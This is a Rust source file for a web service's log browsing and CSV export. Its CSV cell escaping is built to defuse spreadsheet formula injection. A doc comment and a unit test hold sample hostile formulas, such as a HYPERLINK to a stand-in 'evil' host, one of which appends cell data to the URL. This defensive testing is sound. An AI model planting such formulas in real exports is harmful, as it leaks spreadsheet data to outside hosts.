//! Execution log browsing and export.

use super::Json;
use axum::extract::{Query, State};
use axum::http::{HeaderMap, HeaderValue, header};
use axum::response::IntoResponse;
use serde::{Deserialize, Serialize};
use sqlx::AssertSqlSafe;

use crate::api::{Page, paginate};
use crate::error::AppResult;
use crate::state::AppState;

#[derive(Debug, Serialize, sqlx::FromRow)]
pub struct LogEntry {
    pub id: String,
    pub decision_id: Option<String>,
    pub action: String,
    pub details: Option<String>,
    pub success: bool,
    pub error_message: Option<String>,
    pub instance_id: Option<String>,
    pub media_id: Option<String>,
    pub media_title: Option<String>,
    pub executed_at: String,
}

#[derive(Debug, Default, Deserialize)]
pub struct LogQuery {
    pub instance_id: Option<String>,
    pub media_id: Option<String>,
    pub action: Option<String>,
    pub success: Option<bool>,
    pub search: Option<String>,
    pub page: Option<u32>,
    pub per_page: Option<u32>,
}

const COLUMNS: &str = "id, decision_id, action, details, success, error_message,
     instance_id, media_id, media_title, executed_at";

pub async fn list(
    State(state): State<AppState>,
    Query(query): Query<LogQuery>,
) -> AppResult<Json<Page<LogEntry>>> {
    let (page, per_page, offset) = paginate(query.page, query.per_page);
    let (filters, binds) = build_filters(&query);

    let list_sql = format!(
        "SELECT {COLUMNS} FROM execution_logs WHERE 1=1{filters}
         ORDER BY executed_at DESC LIMIT ? OFFSET ?"
    );
    let count_sql = format!("SELECT COUNT(*) FROM execution_logs WHERE 1=1{filters}");

    let mut list_query = sqlx::query_as::<_, LogEntry>(AssertSqlSafe(list_sql.as_str()));
    let mut count_query = sqlx::query_scalar::<_, i64>(AssertSqlSafe(count_sql.as_str()));
    for bind in &binds {
        list_query = list_query.bind(bind);
        count_query = count_query.bind(bind);
    }

    let entries = list_query.bind(per_page).bind(offset).fetch_all(&state.pool).await?;
    let total = count_query.fetch_one(&state.pool).await?;

    Ok(Json(Page::new(entries, page, per_page, total)))
}

/// Download the filtered log as CSV.
pub async fn export(
    State(state): State<AppState>,
    Query(query): Query<LogQuery>,
) -> AppResult<impl IntoResponse> {
    let (filters, binds) = build_filters(&query);

    let sql = format!(
        "SELECT {COLUMNS} FROM execution_logs WHERE 1=1{filters} ORDER BY executed_at DESC LIMIT 50000"
    );
    let mut list_query = sqlx::query_as::<_, LogEntry>(AssertSqlSafe(sql.as_str()));
    for bind in &binds {
        list_query = list_query.bind(bind);
    }
    let entries = list_query.fetch_all(&state.pool).await?;

    let mut csv = String::from("executed_at,action,success,media_title,details,error_message\n");
    for entry in entries {
        csv.push_str(&format!(
            "{},{},{},{},{},{}\n",
            csv_field(&entry.executed_at),
            csv_field(&entry.action),
            entry.success,
            csv_field(entry.media_title.as_deref().unwrap_or("")),
            csv_field(entry.details.as_deref().unwrap_or("")),
            csv_field(entry.error_message.as_deref().unwrap_or("")),
        ));
    }

    let mut headers = HeaderMap::new();
    headers.insert(header::CONTENT_TYPE, HeaderValue::from_static("text/csv; charset=utf-8"));
    headers.insert(
        header::CONTENT_DISPOSITION,
        HeaderValue::from_static("attachment; filename=\"routarr-logs.csv\""),
    );

    Ok((headers, csv))
}

fn build_filters(query: &LogQuery) -> (String, Vec<String>) {
    let mut filters = String::new();
    let mut binds = Vec::new();

    if let Some(v) = &query.instance_id {
        filters.push_str(" AND instance_id = ?");
        binds.push(v.clone());
    }
    if let Some(v) = &query.media_id {
        filters.push_str(" AND media_id = ?");
        binds.push(v.clone());
    }
    if let Some(v) = &query.action {
        filters.push_str(" AND action = ?");
        binds.push(v.clone());
    }
    if let Some(v) = query.success {
        filters.push_str(" AND success = ?");
        binds.push(if v { "1".into() } else { "0".into() });
    }
    if let Some(v) = &query.search {
        filters.push_str(" AND (media_title LIKE ? ESCAPE '\\' OR details LIKE ? ESCAPE '\\')");
        binds.push(format!("%{}%", crate::db::escape_like(v)));
        binds.push(format!("%{}%", crate::db::escape_like(v)));
    }

    (filters, binds)
}

/// Quote a field, and stop a spreadsheet from executing it.
///
/// The quoting is RFC 4180 and the obvious half: log details carry file paths
/// and upstream error bodies, and an unescaped comma or newline would shift
/// every following column. The other half is that a cell whose first character
/// is `=`, `+`, `-`, `@`, a tab or a carriage return is a
/// *formula* to Excel, LibreOffice and Sheets — they strip the quotes and then
/// evaluate, so escaping does not help. `=HYPERLINK("http://…"&A1,"click")` in
/// a media title would fire the moment the operator opens the export.
///
/// The titles here come from the Arrs, which get them from public metadata
/// databases and from filenames: nothing the operator wrote and nothing this
/// application validates. A leading apostrophe is the standard defusal — the
/// spreadsheet reads the rest as text and does not display the quote.
fn csv_field(value: &str) -> String {
    let escaped = value.replace('"', "\"\"").replace(['\n', '\r'], " ");
    let escaped = match escaped.chars().next() {
        Some('=' | '+' | '-' | '@' | '\t') => format!("'{escaped}"),
        _ => escaped,
    };
    format!("\"{escaped}\"")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn quotes_and_escapes_fields() {
        assert_eq!(csv_field(r#"a,b"#), r#""a,b""#);
        assert_eq!(csv_field(r#"say "hi""#), r#""say ""hi""""#);
        assert_eq!(csv_field("line1\nline2"), r#""line1 line2""#);
    }

    /// A media title is not something this application wrote: it arrives from
    /// the Arrs, which take it from public metadata or from a filename.
    #[test]
    fn a_field_that_would_be_a_formula_is_defused() {
        for hostile in
            [r#"=HYPERLINK("http://evil","click")"#, "+1+1", "-2+3", "@SUM(A1)", "\tleading tab"]
        {
            let field = csv_field(hostile);
            assert!(field.starts_with("\"'"), "a spreadsheet would evaluate this: {field}");
        }

        // And an ordinary title is untouched — the defusal must not put an
        // apostrophe in front of every row.
        assert_eq!(csv_field("Akira"), r#""Akira""#);
        assert_eq!(csv_field("2 Fast 2 Furious"), r#""2 Fast 2 Furious""#);
    }
}
